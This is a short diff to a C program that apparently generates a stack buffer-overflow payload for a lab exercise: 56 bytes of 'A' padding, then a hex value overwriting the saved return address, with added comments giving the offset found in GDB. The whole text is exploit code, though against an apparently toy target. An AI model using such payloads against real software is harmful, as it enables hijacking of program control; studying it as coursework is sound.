@@ -4,8 +4,10 @@
 int
 main(void)
 {
+    //From GDB , the input buffer is at 0x4f80 and return addr at 0x4fb8. difference = 56 bytes
     // Write 56 bytes of padding (7 groups of 8 'A' characters).
     // These bytes are sent to standard output.
+    
     write(1, "AAAAAAAA", 8);
     write(1, "AAAAAAAA", 8);
     write(1, "AAAAAAAA", 8);
@@ -15,7 +17,7 @@ main(void)
     write(1, "AAAAAAAA", 8);
 
 
-    // The bytes are using hexadecimal.
+    // Overwrite the saved return address The bytes are using hexadecimal.
     write(1, "\x52\x00\x00\x00\x00\x00\x00\x00", 8);
 
     // Send a newline character to terminate the current input line.
